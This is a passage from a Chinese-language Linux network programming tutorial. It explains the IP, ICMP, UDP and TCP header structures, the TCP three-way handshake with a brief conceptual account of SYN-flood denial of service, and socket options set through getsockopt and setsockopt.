+识&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |DF |MF| 碎片偏移&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br>--------------------------------------------------<br>|&nbsp;&nbsp; 生存时间&nbsp;&nbsp;&nbsp; |&nbsp; 协议&nbsp;&nbsp; |&nbsp; 首部较验和&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br>------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+源IP地
+址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+目的IP地
+址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>-------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+选
+项&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>=================================================<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+数
+据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>-------------------------------------------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ </p>
+<p>下面我们看一看IP的结构定义 </p>
+<p>struct ip<br>&nbsp; {<br>#if __BYTE_ORDER == __LITTLE_ENDIAN<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ unsigned int 
+ip_hl:4;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 
+header length */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unsigned 
+int 
+ip_v:4;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* version */<br>#endif<br>#if __BYTE_ORDER == __BIG_ENDIAN<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ unsigned int 
+ip_v:4;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* version */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unsigned 
+int ip_hl:4;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* header length */<br>#endif<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ u_int8_t 
+ip_tos;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* type of service */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+u_short 
+ip_len;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* total length */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+u_short 
+ip_id;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* identification */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+u_short 
+ip_off;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* fragment offset field */<br>#define IP_RF 
+0x8000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* reserved fragment flag */<br>#define IP_DF 
+0x4000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* dont fragment flag */<br>#define IP_MF 
+0x2000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* more fragments flag */<br>#define IP_OFFMASK 
+0x1fff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* mask for fragmenting bits */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ u_int8_t 
+ip_ttl;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* time to live */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+u_int8_t 
+ip_p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* protocol */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u_short 
+ip_sum;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* checksum */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct in_addr ip_src, ip_dst;&nbsp; /* source and dest address */<br>&nbsp; };</p>
+<p>ip_vIP协议的版本号,这里是4,现在IPV6已经出来了 </p>
+<p>ip_hlIP包首部长度,这个值以4字节为单位.IP协议首部的固定长度为20个字节,如果IP包没有选项,那么这个值为5. </p>
+<p>ip_tos服务类型,说明提供的优先权. </p>
+<p>ip_len说明IP数据的长度.以字节为单位. </p>
+<p>ip_id标识这个IP数据包. </p>
+<p>ip_off碎片偏移,这和上面ID一起用来重组碎片的. </p>
+<p>ip_ttl生存时间.没经过一个路由的时候减一,直到为0时被抛弃. </p>
+<p>ip_p协议,表示创建这个IP数据包的高层协议.如TCP,UDP协议. </p>
+<p>ip_sum首部校验和,提供对首部数据的校验. </p>
+<p>ip_src,ip_dst发送者和接收者的IP地址 </p>
+<p>关于IP协议的详细情况,请参考 RFC791</p>
+<p>7.3 ICMP协议 <br>ICMP是消息控制协议,也处于网络层.在网络上传递IP数据包时,如果发生了错误,那么就会用ICMP协议来报告错误. </p>
+<p>ICMP包的结构如下: </p>
+<p>0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 32<br>---------------------------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 类型&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+代码&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+校验
+和&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>--------------------------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 数据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+数
+据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>--------------------------------------------------------------------</p>
+<p>ICMP在中的定义是 <br>struct icmphdr<br>{<br>&nbsp; u_int8_t 
+type;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* message type */<br>&nbsp; u_int8_t 
+code;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* type sub-code */<br>&nbsp; u_int16_t checksum;<br>&nbsp; union<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; struct<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u_int16_t id;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u_int16_t sequence;<br>&nbsp;&nbsp;&nbsp;
+ } 
+echo;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* echo datagram */<br>&nbsp;&nbsp;&nbsp; u_int32_t&nbsp;&nbsp; gateway;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* gateway address */<br>&nbsp;&nbsp;&nbsp; struct<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u_int16_t __unused;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u_int16_t mtu;<br>&nbsp;&nbsp;&nbsp;
+ } 
+frag;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* path mtu discovery */<br>&nbsp; } un;<br>};</p>
+<p>关于ICMP协议的详细情况可以查看 RFC792</p>
+<p>7.4 UDP协议 <br>UDP协议是建立在IP协议基础之上的,用在传输层的协议.UDP和IP协议一样是不可靠的数据报服务.UDP的头格式为: </p>
+<p><br>0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 32<br>---------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ UDP源端口&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDP目的端口&nbsp;&nbsp;&nbsp;&nbsp; |<br>---------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDP数据报长度&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDP数据报校验&nbsp;&nbsp; |<br>---------------------------------------------------</p>
+<p>UDP结构在中的定义为: <br>struct udphdr {<br>&nbsp; u_int16_t&nbsp;&nbsp;&nbsp;&nbsp; source;<br>&nbsp; u_int16_t&nbsp;&nbsp;&nbsp;&nbsp; dest;<br>&nbsp; u_int16_t&nbsp;&nbsp;&nbsp;&nbsp; len;<br>&nbsp; u_int16_t&nbsp;&nbsp;&nbsp;&nbsp; check;<br>};</p>
+<p>关于UDP协议的详细情况,请参考 RFC768<br>7.5 TCP <br>TCP协议也是建立在IP协议之上的,不过TCP协议是可靠的.按照顺序发送的.TCP的数据结构比前面的结构都要复杂. </p>
+<p>0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8&nbsp; 
+10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 32<br>-------------------------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 源端口&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 目的端口&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br>-------------------------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+序列
+号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>------------------------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+确认
+号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>------------------------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+|U|A|P|S|F|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>|首部长度| 保留&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+|R|C|S|Y|I|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+窗
+口&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+|G|K|H|N|N|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |<br>-----------------------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 校验和&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 紧急指针&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br>-----------------------------------------------------------------<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+选
+项&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ |&nbsp;&nbsp;&nbsp; 填充字节&nbsp;&nbsp; |<br>-----------------------------------------------------------------</p>
+<p>TCP的结构在中定义为: <br>struct tcphdr<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; u_int16_t source;<br>&nbsp;&nbsp;&nbsp; u_int16_t dest;<br>&nbsp;&nbsp;&nbsp; u_int32_t seq;<br>&nbsp;&nbsp;&nbsp; u_int32_t ack_seq;<br>#if __BYTE_ORDER == __LITTLE_ENDIAN<br>&nbsp;&nbsp;&nbsp; u_int16_t res1:4;<br>&nbsp;&nbsp;&nbsp; u_int16_t doff:4;<br>&nbsp;&nbsp;&nbsp; u_int16_t fin:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t syn:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t rst:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t psh:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t ack:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t urg:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t res2:2;<br>#elif __BYTE_ORDER == __BIG_ENDIAN<br>&nbsp;&nbsp;&nbsp; u_int16_t doff:4;<br>&nbsp;&nbsp;&nbsp; u_int16_t res1:4;<br>&nbsp;&nbsp;&nbsp; u_int16_t res2:2;<br>&nbsp;&nbsp;&nbsp; u_int16_t urg:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t ack:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t psh:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t rst:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t syn:1;<br>&nbsp;&nbsp;&nbsp; u_int16_t fin:1;<br>#endif<br>&nbsp;&nbsp;&nbsp; u_int16_t window;<br>&nbsp;&nbsp;&nbsp; u_int16_t check;<br>&nbsp;&nbsp;&nbsp; u_int16_t urg_prt;<br>};&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>source发送TCP数据的源端口 <br>dest接受TCP数据的目的端口 </p>
+<p>seq标识该TCP所包含的数据字节的开始序列号 </p>
+<p>ack_seq确认序列号,表示接受方下一次接受的数据序列号. </p>
+<p>doff数据首部长度.和IP协议一样,以4字节为单位.一般的时候为5 </p>
+<p>urg如果设置紧急数据指针,则该位为1 </p>
+<p>ack如果确认号正确,那么为1 </p>
+<p>psh如果设置为1,那么接收方收到数据后,立即交给上一层程序 </p>
+<p>rst为1的时候,表示请求重新连接 </p>
+<p>syn为1的时候,表示请求建立连接 </p>
+<p>fin为1的时候,表示亲戚关闭连接 </p>
+<p>window窗口,告诉接收者可以接收的大小 </p>
+<p>check对TCP数据进行较核 </p>
+<p>urg_ptr如果urg=1,那么指出紧急数据对于历史数据开始的序列号的偏移值 </p>
+<p>关于TCP协议的详细情况,请查看 RFC793</p>
+<p><br>7.6 TCP连接的建立 <br>TCP协议是一种可靠的连接,为了保证连接的可靠性,TCP的连接要分为几个步骤.我们把这个连接过程称为"三次握手". </p>
+<p>下面我们从一个实例来分析建立连接的过程. </p>
+<p>第一步客户机向服务器发送一个TCP数据包,表示请求建立连接. 为此,客户端将数据包的SYN位设置为1,<br>并且设置序列号seq=1000(我们假设为1000). </p>
+<p>第二步服务器收到了数据包,并从SYN位为1知道这是一个建立请求的连接.于是服务器也向客户端发送一个TCP数据包.<br>因为是响应客户机的请求, 于是服务器设置ACK为1,sak_seq=1001(1000+1)同时设置自己的序列号.seq=2000(我们假设为2000). </p>
+<p>第三步客户机收到了服务器的TCP,并从ACK为1和ack_seq=1001知道是从服务器来的确认信息.于是客户机也向服务器发送确认信息.<br>客户机设置ACK=1,和ack_seq=2001,seq=1001,发送给服务器.至此客户端完成连接. </p>
+<p>最后一步服务器受到确认信息,也完成连接. </p>
+<p>通过上面几个步骤,一个TCP连接就建立了.当然在建立过程中可能出现错误,不过TCP协议可以保证自己去处理错误的. </p>
+<p><br>说一说其中的一种错误.<br>&nbsp; 听说过DOS吗?(可不是操作系统啊).今年春节的时候,美国的五大网站一起受到攻击.攻击者用的就是DOS(拒绝式服务)方式.<br>&nbsp; 概括的说一下原理.客户机先进行第一个步骤.服务器收到后,进行第二个步骤.按照正常的TCP连接,客户机应该进行第三个步骤.<br>&nbsp; 不过攻击者实际上并不进行第三个步骤.因为客户端在进行第一个步骤的时候,修改了自己的IP地址,就是说将一个实际上不存在的<br>&nbsp; IP填充在自己IP 数据包的发送者的IP一栏.这样因为服务器发的IP地址没有人接收,所以服务端会收不到第三个步骤的确认信号,<br>&nbsp; 这样服务务端会在那边一直等待,直到超时.这样当有大量的客户发出请求后,服务端会有大量等待,直到所有的资源被用光,<br>&nbsp; 而不能再接收客户机的请求.这样当正常的用户向服务器发出请求时,由于没有了资源而不能成功.<br>&nbsp; 于是就出现了春节时所出现的情况.</p>
+<p><br>(八)Linux网络编程--8. 套接字选项</p>
+<p>有时候我们要控制套接字的行为(如修改缓冲区的大小),这个时候我们就要控制套接字的选项了. </p>
+<p><br>8.1 getsockopt和setsockopt </p>
+<p>int getsockopt(int sockfd,int level,int optname,void *optval,socklen_t *optlen)<br>int setsockopt(int sockfd,int level,int optname,const void *optval,socklen_t *optlen)</p>
+<p>level指定控制套接字的层次.可以取三种值: <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1)SOL_SOCKET:通用套接字选项. <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2)IPPROTO_IP:IP选项. <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3)IPPROTO_TCP:TCP选项. <br>optname指定控制的方式(选项的名称),我们下面详细解释 </p>
+<p>optval获得或者是设置套接字选项.根据选项名称的数据类型进行转换 </p>
+<p><br>选项名
+称&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+说
+明&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 数据类型<br>========================================================================<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ SOL_SOCKET<br>------------------------------------------------------------------------<br>SO_BROADCAST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+允许发送广播数
+据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_DEBUG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+允许调
+试&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_DONTROUTE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+不查找路
+由&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_ERROR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+获得套接字错
+误&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_KEEPALIVE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+保持连
+接&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
